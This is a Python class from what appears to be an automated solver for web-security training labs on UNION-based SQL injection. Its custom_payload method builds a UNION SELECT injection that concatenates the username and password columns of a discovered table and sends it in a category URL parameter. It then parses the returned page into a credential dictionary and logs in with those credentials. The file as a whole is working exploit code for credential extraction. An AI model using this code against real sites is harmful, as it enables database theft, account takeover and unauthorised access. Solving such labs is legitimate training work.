from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class UnionQueryRetrieveMultipleValuesSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)

    def solve(self):
        """Solve the lab."""
        self.determine_DBMS()
        self.determine_column_number()
        self.determine_DB_version()
        self.retrieve_table_name()
        self.retrieve_column_name()
        self.custom_payload()
        self.request_login(allow_redirects=False)
        self._print_solved()


    def custom_payload(self):
        """Build the payload."""
        self.spinner.start()
        self.spinner.text = 'Retrieve the Data'
        null = 'NULL,' * (self.total_columns-1)
        self.column_name = sorted(self.column_name)
        payload = f"' UNION SELECT {null}{self.column_name[2]}||'~'||{self.column_name[1]} FROM {self.table_name}-- -"
        url_brute = self.url + self.categories_url[1] + payload
        self._request_lab('GET', url_brute)
        th_html = self.soup_html.find_all('th')
        username = []
        password = []
        for th in th_html:
            if '~' in th.text:
                username.append(th.text.split('~')[0])
                password.append(th.text.split('~')[1])    
        self.spinner.stop()
        self.list_users = dict(zip(username, password))
        self._print_table(f"\nData of {self.table_name}", ["Username", "Password"], zip(username, password))